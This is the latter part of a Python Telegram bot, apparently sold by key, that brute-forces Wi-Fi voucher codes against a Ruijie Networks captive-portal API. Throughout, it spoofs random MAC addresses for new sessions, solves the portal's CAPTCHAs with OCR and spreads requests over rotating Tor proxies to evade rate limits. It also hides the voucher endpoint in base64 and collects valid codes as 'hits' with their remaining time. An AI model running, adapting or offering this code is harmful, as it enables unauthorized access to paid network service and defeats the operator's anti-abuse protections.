            f"❌ Expired: 0\n"
            f"⭕ Limits: {retries}\n"
            f"⚡ Speed: {speed_str}\n"
            f"🌐 Proxies: {proxy_text}\n"
            f"📊 Progress: {percent:.2f}%\n"
            f"[{bar}]"
            f"{hit_section}"
        )
    return (
        f"{heading}\n"
        "Thank for using By Telegram @bopaing_789\n"
        "━━━━━━━━━━━━\n"
        f"✅ Tried: {checked:,}\n"
        f"🔄 Current Code: {current_code}\n"
        f"✅ Hits: {found}\n"
        f"❌ Expired: 0\n"
        f"⭕ Limits: {retries}\n"
        f"⚡ Speed: {speed_str}\n"
        f"🌐 Proxies: {proxy_text}\n"
        f"📊 Status: running"
        f"{hit_section}"
    )

BATCH_SIZE = 5000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(
    mode,
    chat_id,
    session_url,
    scan_id,
    message=None,
    progress_msg=None,
    leading_digit=None
):
    try:
        code_iter = iter_codes(mode, leading_digit=leading_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = scan_total(mode, leading_digit)
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    global _voucher_sem
    effective_concurrency = (1000 * max(1, len(_tor_connectors))) if proxy_enabled else CONCURRENCY
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    last_update = time.monotonic()

    async def _check(code):
        current_task = scan_tasks.get(chat_id)
        if current_task and current_task.get("scan_id") == scan_id:
            current_task["current_code"] = code
        async with _voucher_sem:
            return await perform_check(
                session_url, code, chat_id, scan_id, message=message
            )

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 2.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        retries = retry_counts.get(chat_id, 0)
        current_code = scan_tasks.get(chat_id, {}).get("current_code", "-")
        hit_codes = success_texts.get(chat_id, [])
        if chat_id in scan_tasks:
            scan_tasks[chat_id]["checked"] = checked
            scan_tasks[chat_id]["speed"] = speed
            scan_tasks[chat_id]["found"] = found
            scan_tasks[chat_id]["retries"] = retries
        text = format_progress(
            checked,
            total,
            speed,
            found,
            retries,
            current_code=current_code,
            hit_codes=hit_codes
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                reply_markup=build_scan_stop_menu()
            )
        except Exception:
            try:
                new_msg = await bot.send_message(
                    chat_id,
                    text,
                    reply_markup=build_scan_stop_menu()
                )
                progress_msg.message_id = new_msg.message_id
                if chat_id in scan_tasks:
                    scan_tasks[chat_id]["progress_message_id"] = new_msg.message_id
            except Exception as err:
                print(f"Progress Message Error: {err}")

    try:
        for code in code_iter:
            # Stop / cancelled check
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                break
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                break

            # Key expiration check every 600 s
            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    not has_active_key(auth_list.get(str(chat_id)))
                ):
                    approve[chat_id] = False
                    await bot.send_message(
                        chat_id,
                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
                    )
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    break
                last_key_check = time.monotonic()

            # Launch task; discard from pending set on completion
            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            # When at capacity: wait for at least one to finish before adding more
            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        # Drain remaining in-flight tasks
        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "✅ Scanner Completed\n"
                "Thank for using By Telegram @bopaing_789\n"
                "━━━━━━━━━━━━\n"
                f"✅ Tried: {checked:,}\n"
                f"✅ Hits: {final_found}\n"
                f"⭕ Limits: {final_retries}\n"
                "📊 Progress: 100%\n"
                "[████████████████████]"
            )
            if success_texts.get(chat_id):
                finish_text += "\n\n📄 Hit code အပြည့်အစုံကို အောက်မှာ အပိုင်းခွဲပို့ပေးပါမယ်။"
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text,
                    reply_markup=build_back_menu()
                )
            except:
                try:
                    await bot.send_message(
                        chat_id,
                        finish_text,
                        reply_markup=build_back_menu()
                    )
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
            if success_texts.get(chat_id):
                await send_hit_codes_file(chat_id, success_texts[chat_id])
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        _session_pool.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            print(f"[get_session_id] status={req.status} final_url={response}")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                print(f"[get_session_id] found sessionId={session_id.group(1)}")
                return session_id.group(1)
            else:
                print(f"[get_session_id] no sessionId in URL, returning previous={previous_session_id}")
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] ERROR url={session_url[:80]} exception={type(e).__name__}: {e}")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 10

async def get_pooled_session_id(chat_id, task_session, session_url):
    if chat_id not in _session_pool:
        _session_pool[chat_id] = {
            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
            "rr": 0
        }
    pool = _session_pool[chat_id]

    # Round-robin: find any slot with remaining capacity
    for i in range(SESSION_POOL_SLOTS):
        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
        entry = pool["slots"][idx]
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
            entry["uses"] += 1
            return entry["session_id"]

    # All slots exhausted — refresh the next slot (non-blocking for others)
    idx = pool["rr"] % SESSION_POOL_SLOTS
    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
    entry = pool["slots"][idx]
    async with entry["lock"]:
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            entry["uses"] += 1
            return entry["session_id"]
        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
        if new_sid:
            entry["session_id"] = new_sid
            entry["uses"] = 1
            print(f"[session-pool] chat={chat_id} slot={idx} new sessionId={new_sid}")
        return entry["session_id"]

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=60 if proxy_enabled else 30)
        conn = _next_tor_connector()

        async with aiohttp.ClientSession(
            connector=conn,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🔑 {code}\n   {expire_date}")
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message and chat_id not in scan_tasks:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            connector_owner=True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None


async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    validate_config()
    await rebuild_session(use_proxy=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await bot.set_my_commands([
            types.BotCommand("start", "Main menu ဖွင့်ရန်"),
            types.BotCommand("menu", "Main menu ပြရန်"),
            types.BotCommand("key", "Key စစ်ရန်"),
            types.BotCommand("input", "Session URL ထည့်ရန်"),
            types.BotCommand("scan", "Scan စရန်"),
            types.BotCommand("result", "Result ကြည့်ရန်"),
            types.BotCommand("recheck", "Result ပြန်စစ်ရန်"),
            types.BotCommand("stop", "Scan ရပ်ရန်"),
        ])
        if ADMIN_ID.isdigit():
            await bot.set_my_commands([
                types.BotCommand("genkey", "Key ထုတ်ရန်"),
                types.BotCommand("listkeys", "Key စာရင်းကြည့်ရန်"),
                types.BotCommand("delkey", "Key ဖျက်ရန်"),
                types.BotCommand("status", "Bot status ကြည့်ရန်"),
                types.BotCommand("stats", "Scan stats ကြည့်ရန်"),
                types.BotCommand("proxy", "Tor proxy ထိန်းရန်"),
            ], scope=types.BotCommandScopeChat(chat_id=int(ADMIN_ID)))
        await start_polling()
    finally:
        if session and not session.closed:
            await session.close()
        if _connector and not _connector.closed:
            await _connector.close()
        for c in _tor_connectors:
            if not c.closed:
                await c.close()
        for p in _tor_processes:
            try:
                if p.returncode is None:
                    p.terminate()
            except Exception:
                pass

if __name__ == '__main__':
    asyncio.run(main())
